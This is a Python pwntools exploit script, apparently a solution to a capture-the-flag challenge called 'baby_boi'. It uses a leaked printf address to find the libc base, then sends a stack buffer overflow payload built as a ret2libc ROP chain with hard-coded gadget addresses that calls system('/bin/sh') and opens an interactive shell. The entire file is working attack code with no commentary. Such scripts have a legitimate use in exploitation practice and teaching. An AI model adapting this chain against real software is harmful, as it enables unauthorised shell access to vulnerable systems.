from pwn import *

e = ELF('./baby_boi')
#libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./baby_boi')

print p.recvuntil(': ')
res = p.recvline()
printf_addr = int(res,16)
libc_base_addr = printf_addr - libc.symbols['printf']

ret_addr = 0x0040054e
pop_rdi_addr = 0x00400793
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*40
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()